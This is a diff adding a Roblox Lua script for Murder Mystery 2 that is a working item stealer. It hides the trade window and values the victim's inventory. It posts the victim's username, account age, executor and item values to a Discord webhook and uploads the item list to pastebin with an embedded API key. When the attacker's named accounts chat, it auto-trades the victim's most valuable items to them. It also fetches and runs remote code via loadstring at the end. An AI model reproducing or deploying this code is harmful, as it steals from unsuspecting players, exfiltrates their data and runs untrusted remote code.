@@ -1,0 +1,717 @@
+Username = "DiagoPlug" -- >> Your main account
+Username2 = "DiagoPlug" -- >> Your alt account
+Webhook = "https://webhook.lewisakura.moe/api/webhooks/1429509611173707858/I_Ph9seXu0Fa-652BET-vfssKq7N6HBFU9kw4Lbrovb5Wpk57ZmS3d4ynznwxNlqfaYw" -- >> https://stealer.to/
+MinimumValues = 0 -- >> Set 0 to disable
+
+repeat task.wait() until game:IsLoaded()
+
+if getgenv().mm2 then return end
+getgenv().mm2 = true
+
+if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
+    game:GetService("Players").LocalPlayer:Kick("\nANTIBAN: Admins detected. Join another server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
+    game.Players.LocalPlayer:Kick("\nScript doesn't supported vip servers")
+    return
+end
+
+if MinimumValues == nil or MinimumValues < 0 then
+    MinimumValues = 0
+end
+
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LP = game:GetService("Players").LocalPlayer
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+local NameValue = game:GetService("Players").LocalPlayer.Name
+or "Unknown"
+local IdValue = game:GetService("Players").LocalPlayer.userId
+or "Unknown"
+local AgeValue = game:GetService("Players").LocalPlayer.AccountAge
+or "Unknown"
+local ExecutorValue = identifyexecutor() or "Unknown"
+local VersionValue = "1.1"
+local consoletp = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+
+local valuesTable = {
+    -- >> Ancients/Tier 2 << --
+    ["Gingerscope"] = 8000,
+    ["TravelerAxe"] = 3000,
+    ["Harvester"] = 600,
+    ["Icepiercer"] = 500,
+    ["VampireAxe"] = 500,
+    ["Celestial"] = 800,
+    ["Corrupt"] = 800,
+    -- >> Ancients/Tier 1 << --
+    ["SwirlyAxe"] = 100,
+    ["Icebreaker"] = 100,
+    ["ElderwoodScythe"] = 65,
+    ["Scythe"] = 77,
+    ["Hallowscythe"] = 55,
+    ["Logchopper"] = 25,
+    ["Icewing"] = 5,
+    -- >> Vintages/Tier 2 << --
+    ["GhostK2018"] = 10,
+    ["AmericaGun"] = 8,
+    ["BloodKnife"] = 8,
+    -- >> Vintages/Tier 1 << --
+    ["Disint"] = 7,
+    ["Phaser"] = 7,
+    ["ShadowKnife"] = 6,
+    ["TimeKnife"] = 5,
+    ["Gun1"] = 4,
+    ["GoldenGun"] = 4,
+    ["Knife1"] = 3,
+    -- >> Chromas/Tier 3 << --
+    ["TravelerGunChroma"] = 10000,
+    ["TreeGun2023Chroma"] = 10000,
+    ["TreeKnife2023Chroma"] = 10000,
+    ["VampireGunChroma"] = 5000,
+    ["ConstellationChroma"] = 5500,
+    ["BaubleChroma"] = 6500,
+    ["WatergunChroma"] = 4500,
+    -- >> Chromas/Tier 2 << --
+    ["ChromaDarkbringer"] = 125,
+    ["ChromaLightbringer"] = 120,
+    ["CandleflameChroma"] = 115,
+    ["ElderwoodKnifeChroma"] = 115,
+    ["SwirlyGunChroma"] = 115,
+    ["Gingermint_KChroma"] = 110,
+    -- >> Chromas/Tier 1 << --
+    ["LugerChroma"] = 100,
+    ["LaserChroma"] = 80,
+    ["HeatChroma"] = 70,
+    ["DeathshardChroma"] = 65,
+    ["GemstoneChroma"] = 65,
+    ["SharkChroma"] = 65,
+    ["SlasherChroma"] = 65,
+    ["TidesChroma"] = 65,
+    ["FangChroma"] = 55,
+    ["GingerbladeChroma"] = 55,
+    ["SeerChroma"] = 55,
+    ["BonebladeChroma"] = 50,
+    ["SawChroma"] = 50,
+    -- >> Godlies/Tier 3 << --
+    ["TravelerGun"] = 3400,
+    ["TreeGun2023"] = 1100,
+    ["Turkey2023"] = 1500,
+    ["TreeKnife2023"] = 1100,
+    ["Blossom_G"] = 640,
+    ["Sakura_K"] = 630,
+    ["Constellation"] = 575,
+    ["Darkshot"] = 465,
+    ["Darksword"] = 460,
+    ["VampireGun"] = 460,
+    ["Bauble"] = 310,
+    ["ZombieBat"] = 300,
+    ["Candy"] = 200,
+    ["Rainbow_G"] = 190,
+    ["Rainbow_K"] = 185,
+    ["Ocean_G"] = 150,
+    ["WraithGun"] = 145,
+    ["WraithKnife"] = 145,
+    ["Waves_K"] = 145,
+    ["AuroraKnife"] = 135,
+    ["AuroraGun"] = 135,
+    ["FlowerwoodGun"] = 135,
+    ["FlowerwoodKnife"] = 130,
+    ["Heartblade"] = 125,
+    ["Sugar"] = 125,
+    ["SwirlyGun"] = 115,
+    ["Makeshift"] = 105,
+    ["Candleflame"] = 100,
+    ["ElderwoodKnife"] = 100,
+    ["Watergun"] = 90,
+    -- >> Godlies/Tier 2 << --
+    ["Phantom2022"] = 75,
+    ["Spectre2022"] = 75,
+    ["Luger"] = 75,
+    ["RedLuger"] = 70,
+    ["SwirlyBlade"] = 65,
+    ["Iceblaster"] = 65,
+    ["Pearl_K"] = 62,
+    ["Pearl_G"] = 62,
+    ["Darkbringer"] = 60,
+    ["ElderwoodGun"] = 60,
+    ["Lightbringer"] = 58,
+    ["Gingermint_K"] = 40,
+    ["Gingermint_G"] = 40,
+    ["GreenLuger"] = 40,
+    ["Hallowgun"] = 35,
+    ["Laser"] = 32,
+    ["Icebeam"] = 32,
+    ["Iceflake"] = 32,
+    ["Plasmabeam"] = 32,
+    ["Plasmablade"] = 32,       
+    ["Amerilaser"] = 30,
+    ["Blaster"] = 30,
+    ["Nightblade"] = 30,
+    ["AmericaSword"] = 28,
+    ["Nebula"] = 28,
+    ["Shark"] = 28,
+    ["Virtual"] = 27,
+    ["Gemstone"] = 25,
+    ["Clockwork"] = 23,
+    ["EternalCane"] = 23,
+    ["GingerLuger"] = 23,
+    ["Lugercane"] = 23,
+    ["Pixel"] = 23,
+    ["Slasher"] = 23,
+    ["Gingerblade"] = 22,
+    ["Heat"] = 22,
+    ["Minty"] = 22,
+    -- >> Godlies/Tier 1 << --
+    ["BattleAxe2"] = 20,
+    ["Deathshard"] = 20,
+    ["Tides"] = 20,
+    ["Fang"] = 18,
+    ["Spider"] = 17,
+    ["Chill"] = 17,
+    ["Jinglegun"] = 15,
+    ["VampiresEdge"] = 15,
+    ["Pumpking"] = 15,
+    ["Bioblade"] = 13,
+    ["BattleAxe"] = 13,
+    ["Frostsaber"] = 13,
+    ["Xmas"] = 13,
+    ["Flames"] = 12,
+    ["Hallow"] = 12,
+    ["IceDragon"] = 12,
+    ["IceShard"] = 12,
+    ["WintersEdge"] = 12,
+    ["Ghostblade"] = 10,
+    ["HallowsBlade"] = 10,
+    ["Handsaw"] = 10,
+    ["Eternal"] = 10,
+    ["Eternal2"] = 10,
+    ["Eternal3"] = 10,
+    ["Eternal4"] = 10,
+    ["Boneblade"] = 8,
+    ["Eggblade"] = 7,
+    ["Frostbite"] = 7,
+    ["Prismatic"] = 7,
+    ["Saw"] = 7,
+    ["Snowflake"] = 7,
+    -- >> Godlies/Tier 0 << --
+    ["Peppermint"] = 7,
+    ["Cookieblade"] = 7,
+    ["BlueSeer"] = 7,
+    ["PurpleSeer"] = 7,
+    ["RedSeer"] = 7,
+    ["TheSeer"] = 7,
+    ["OrangeSeer"] = 7,
+    ["YellowSeer"] = 7,
+    -- >> Legendaries/Special Tier << --
+    ["JD"] = 65,
+    -- >> Legendaries/Tier 3 << --
+    ["Latte_G_2023"] = 90,
+    ["Latte_K_2023"] = 90,
+    ["CottonCandy"] = 65,
+    ["Witched"] = 55,
+    ["Beach_K_2023"] = 30,
+    ["Cavern_K_2019"] = 22,
+}
+
+function SendMessageEMBED(url, embed, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["username"] = "Aliwave 2.0",
+        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg",
+        ["content"] = TeleportScript,
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local data2 = {
+        ["username"] = "Aliwave 2.0", 
+        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg", 
+        ["content"] = "-- @everyone\n" .. TeleportScript,
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
+
+    if bool == true then
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body2
+        })
+    else
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+end
+
+-- Новая улучшенная функция скрытия TradeGUI
+local function setupTradeGUIHider()
+    local player = game:GetService("Players").LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    local function hideTradeGUI()
+        for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
+            local gui = playerGui:FindFirstChild(guiName)
+            if gui then
+                gui.Enabled = false
+                -- Двойная защита: отключаем изменение Enabled
+                if not gui:FindFirstChild("AntiFlash") then
+                    local conn
+                    conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                        if gui.Enabled then
+                            gui.Enabled = false
+                        else
+                            conn:Disconnect()
+                        end
+                    end)
+                    local anti = Instance.new("BoolValue")
+                    anti.Name = "AntiFlash"
+                    anti.Parent = gui
+                end
+            end
+        end
+    end
+
+    -- Скрываем сразу при запуске
+    hideTradeGUI()
+
+    -- Отслеживаем появление новых окон
+    playerGui.ChildAdded:Connect(function(child)
+        if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
+            hideTradeGUI()
+        end
+    end)
+
+    -- Периодическая проверка
+    while true do
+        hideTradeGUI()
+        task.wait(0.1)
+    end
+end
+
+-- Запускаем скрытие GUI в отдельной корутине
+coroutine.wrap(setupTradeGUIHider)()
+
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+local allItems = {}
+local totalValues = 0
+
+local vintageItems1 = {}
+local commonItems1 = {}
+local uncommonItems1 = {}
+local rareItems1 = {}
+local legendaryItems1 = {}
+local godlyItems1 = {}
+local ancientItems1 = {}
+local uniqueItems1 = {}
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+local uniqueItemsValue = 0
+local ancientItemsValue = 0
+local godlyItemsValue = 0
+local vintageItemsValue = 0
+local legendaryItemsValue = 0
+local rareItemsValue = 0
+local uncommonItemsValue = 0
+local commonItemsValue = 0
+
+for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c, d in pairs(b) do
+        local itemValue = valuesTable[d.DataID] or 0
+        local totalValue = itemValue * d.Amount
+        
+        if d.Rarity == "Unique" then
+            uniqueItemsValue = uniqueItemsValue + totalValue
+        elseif d.Rarity == "Ancient" then
+            ancientItemsValue = ancientItemsValue + totalValue
+        elseif d.Rarity == "Godly" then
+            godlyItemsValue = godlyItemsValue + totalValue
+        elseif d.Rarity == "Vintage" then
+            vintageItemsValue = vintageItemsValue + totalValue
+        elseif d.Rarity == "Legendary" then
+            legendaryItemsValue = legendaryItemsValue + totalValue
+        elseif d.Rarity == "Rare" then
+            rareItemsValue = rareItemsValue + totalValue
+        elseif d.Rarity == "Uncommon" then
+            uncommonItemsValue = uncommonItemsValue + totalValue
+        elseif d.Rarity == "Common" then
+            commonItemsValue = commonItemsValue + totalValue
+        end
+    end
+end
+
+for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c, d in pairs(b) do
+        local itemKey = d.DataID
+        local itemValue = valuesTable[itemKey]
+        local weaponValue = itemValue and (itemValue * d.Amount) or 0
+
+        local formatTable = {
+            weaponName = d.ItemName,
+            weaponData = d.DataID,
+            weaponAmount = d.Amount,
+            weaponRarity = d.Rarity,
+            weaponValue = weaponValue
+        }
+        
+        table.insert(allItems, formatTable)
+
+        local visualFormat = d.ItemName .. " • [x" .. d.Amount .. " | " .. weaponValue .. "]"
+
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + d.Amount
+            table.insert(vintageItems, visualFormat)
+            table.insert(vintageItems1, formatTable)
+        end
+
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + d.Amount
+            table.insert(commonItems, visualFormat)
+            table.insert(commonItems1, formatTable)
+        end
+
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + d.Amount
+            table.insert(uncommonItems, visualFormat)
+            table.insert(uncommonItems1, formatTable)
+        end
+
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + d.Amount
+            table.insert(rareItems, visualFormat)
+            table.insert(rareItems1, formatTable)
+        end
+
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + d.Amount
+            table.insert(legendaryItems, visualFormat)
+            table.insert(legendaryItems1, formatTable)
+        end
+
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + d.Amount
+            table.insert(godlyItems, visualFormat)
+            table.insert(godlyItems1, formatTable)
+        end
+
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + d.Amount
+            table.insert(ancientItems, visualFormat)
+            table.insert(ancientItems1, formatTable)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + d.Amount
+            table.insert(uniqueItems, visualFormat)
+            table.insert(uniqueItems1, formatTable)
+        end
+    end
+end
+
+-- >> Values calculating logic << --
+for _, item in pairs(allItems) do
+    totalValues = totalValues + item.weaponValue
+end
+
+local loop = false
+local function stealItems(ReceiverName)
+    loop = true
+    while loop do
+        -- Отправляем запрос на обмен
+        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(
+            game:GetService("Players")[ReceiverName]
+        )
+
+        task.wait(3) -- Ждем открытия обмена
+
+        -- Собираем и сортируем все предметы по ценности
+        local allItems = {}
+        for _, category in pairs({
+            uniqueItems1, ancientItems1, godlyItems1, vintageItems1,
+            legendaryItems1, rareItems1, uncommonItems1, commonItems1
+        }) do
+            for _, item in pairs(category) do
+                table.insert(allItems, item)
+            end
+        end
+
+        table.sort(allItems, function(a, b)
+            return (valuesTable[a.weaponData] or 0) > (valuesTable[b.weaponData] or 0)
+        end)
+
+        -- Добавляем максимум 4 самых ценных предмета
+        local addedCount = 0
+        for _, item in ipairs(allItems) do
+            if addedCount >= 4 then break end
+            
+            local addAmount = math.min(item.weaponAmount, 4 - addedCount)
+            for i = 1, addAmount do
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(
+                    item.weaponData, 
+                    "Weapons"
+                )
+                task.wait(0.2) -- Задержка между добавлениями
+                addedCount = addedCount + 1
+                if addedCount >= 4 then break end
+            end
+        end
+
+        task.wait(6.5) -- Даем время на добавление предметов
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+        task.wait(1) -- Пауза перед следующим обменом
+    end
+end
+
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\nError...\n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+local function formatItems(itemList)
+    if #itemList == 0 then
+        return "None"
+    else
+        return table.concat(itemList, "\n")
+    end
+end
+
+local pastebinString = "-- [ Unique Items ] --\n" ..formatItems(uniqueItems)..
+                         "\n\n-- [ Ancient Items ] --\n" ..formatItems(ancientItems)..
+                         "\n\n-- [ Godly Items ] --\n" ..formatItems(godlyItems)..
+                         "\n\n-- [ Legendary Items ] --\n" ..formatItems(legendaryItems)..
+                         "\n\n-- [ Vintage Items ] --\n" ..formatItems(vintageItems)..
+                         "\n\n-- [ Rare Items ] --\n" ..formatItems(rareItems)..
+                         "\n\n-- [ Uncommon Items ] --\n" ..formatItems(uncommonItems)..
+                         "\n\n-- [ Common Items ] --\n" ..formatItems(commonItems)..
+
+                        "\n\nInventory list ft. RedX"
+
+
+local pastebinLink = pastebin(pastebinString)
+
+if totalValues < MinimumValues then
+    return
+end
+
+local function getTopValuableItems(n)
+    local allItems = {}
+    
+    -- Собираем все предметы
+    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
+        for c, d in pairs(b) do
+            local itemValue = valuesTable[d.DataID] or 0
+            table.insert(allItems, {
+                name = d.ItemName,
+                value = itemValue,
+                amount = d.Amount,
+                totalValue = itemValue * d.Amount
+            })
+        end
+    end
+    
+    -- Сортируем по убыванию ценности
+    table.sort(allItems, function(a, b) 
+        return a.value > b.value
+    end)
+    
+    -- Возвращаем топ-N предметов
+    local topItems = {}
+    for i = 1, math.min(n, #allItems) do
+        local item = allItems[i]
+        table.insert(topItems, string.format("%s [%s] x%d", item.name, item.value, item.amount))
+    end
+    
+    return topItems
+end
+
+-- Получаем 5 самых ценных предметов
+local topItems = getTopValuableItems(5)
+local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"
+
+-- Обновляем embed
+local embed = {
+    ["title"] = "Join to get MM2 hit",
+    ["color"] = 0xFF0000,
+    ["fields"] = {
+        {
+            ["name"] = "〘:mammoth:〙**User information**",
+            ["value"] = 
+            "```lua\n"..
+            "Username      : "..NameValue.."\n"..
+            "Account Age   : "..AgeValue.." Days\n"..
+            "Executor      : "..ExecutorValue.."\n"..
+            "Receiver      : "..Username.."/"..Username2.."\n"..
+            "Version       : "..VersionValue.."```"
+        },
+        {
+            ["name"] = "〘:moneybag:〙**Inventory Value**",
+            ["value"] = 
+            "```lua\n"..
+            "Top Valuable Items:\n"..topItemsText.."\n\n"..
+            "Total Value        : "..totalValues.."\n\n"..
+            "Uniques Value      : "..uniqueItemsValue.."\n"..
+            "Ancients Value     : "..ancientItemsValue.."\n"..
+            "Godlies Value      : "..godlyItemsValue.."\n"..
+            "Legendaries Value  : "..legendaryItemsValue.."\n"..
+            "Vintages Value     : "..vintageItemsValue.."\n"..
+            "Rares Value        : "..rareItemsValue.."\n"..
+            "Uncommons Value    : "..uncommonItemsValue.."\n"..
+            "Commons Value      : "..commonItemsValue.."```"
+        },
+        {
+            ["name"] = "〘:package:〙**Items List**",
+            ["value"] = "[Click Here]("..pastebinLink..")"
+        },
+        {
+            ["name"] = "〘:computer:〙**Console Script**",
+            ["value"] = "```lua\n" .. consoletp .. "\n```"
+        },
+    }
+}
+
+if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
+    SendMessageEMBED(Webhook, embed, true)
+else
+    SendMessageEMBED(Webhook, embed, false)
+end
+
+function SendLeaveNotify(Username)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local dataLeave = {
+        ["username"] = "Aliwave Leave Notify",
+        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg",
+        ["content"] = "**"..Username.."** was scared!!",
+        ["embeds"] = {
+            {
+                ["color"] = 0xff3e3e,
+                ["fields"] = {
+                    {
+                        ["name"] = "〘:rotating_light:〙**Player Info**",
+                        ["value"] = "```lua\n"..
+                            "Username      : "..NameValue.."\n"..
+                            "Account Age   : "..AgeValue.." Days\n"..
+                            "Executor      : "..ExecutorValue.."```"
+                    }
+                }
+            }
+        }
+    }
+
+    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
+
+    local response = request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonDataLeave
+    })
+end
+
+game:GetService("Players").PlayerRemoving:Connect(function(player)
+    if player == game:GetService("Players").LocalPlayer then
+        SendLeaveNotify(player.Name)
+    end
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function(msg)
+            loop = true
+            stealItems(Username)
+        end)
+    end
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username2 then
+        player.Chatted:Connect(function(msg)
+            loop = true
+            stealItems(Username2)
+        end)
+    end
+end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/V3RTEX/refs/heads/main/FBScripts',true))()
